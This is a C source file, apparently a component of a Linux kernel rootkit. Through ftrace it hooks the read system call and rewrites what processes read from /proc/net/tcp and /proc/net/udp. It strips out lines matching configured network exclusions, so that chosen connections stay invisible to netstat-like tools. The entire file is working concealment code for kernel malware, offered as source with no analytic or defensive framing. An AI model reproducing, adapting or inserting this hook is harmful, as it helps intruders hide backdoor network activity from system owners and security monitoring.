#include <linux/file.h>

#include "utils/excludes/net_filtering.h"
#include "utils/ftrace_utils.h"
#include "hooks/x64_sys_read.h"

#if LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0)
asmlinkage long (*orig_read)(unsigned int fd, char __user *buf, size_t count);

asmlinkage long hook_read(unsigned int fd, char __user *buf, size_t count) {
    long ret = orig_read(fd, buf, count);
    return hook_read_impl(fd, buf, ret);
}
#else
asmlinkage long (*orig_read)(const struct pt_regs *regs);

asmlinkage int hook_read(const struct pt_regs *regs) {
    unsigned int fd = regs->di;
    char __user *buf = (char __user *)regs->si;
    long ret = orig_read(regs);
    return hook_read_impl(fd, buf, ret);
}
#endif


long hook_read_impl(unsigned int fd, char __user *buf, long ret) {
    if (net_exclusions_are_empty()) {
            return ret; // do nothing
    } 
    ssize_t ret2 = ret;
    struct file *f = fget(fd);

    if (f && f->f_path.dentry) {
        // check if currently reading from /proc/net/tcp or /proc/net/udp
        if (((strcmp(f->f_path.dentry->d_name.name, "tcp") == 0) || (strcmp(f->f_path.dentry->d_name.name, "udp") == 0)) &&
            f->f_path.dentry->d_parent &&
            strcmp(f->f_path.dentry->d_parent->d_name.name, "net") == 0) {

            if (ret2 <= 0) {
                fput(f);
                return ret2;
            }

            {
                char *kbuf = kmalloc(ret2 + 1, GFP_KERNEL);
                char *filtered;
                size_t new_len;

                if (!kbuf) {
                    fput(f);
                    return ret2;
                }
                if (copy_from_user(kbuf, buf, ret2)) {
                    kfree(kbuf);
                    fput(f);
                    return ret2;
                }
                kbuf[ret2] = '\0';

                filtered = filter_netstat_lines(kbuf, &new_len);
                kfree(kbuf);

                if (filtered) {
                    if (copy_to_user(buf, filtered, new_len)) {
                        kfree(filtered);
                        fput(f);
                        return ret2; // fall back to unfiltered data on failure
                    }
                    ret2 = new_len;
                    kfree(filtered);
                }
            }
            fput(f);
            return ret2;
        }
    }
    if (f) {
        fput(f);
    }
    return ret;
}
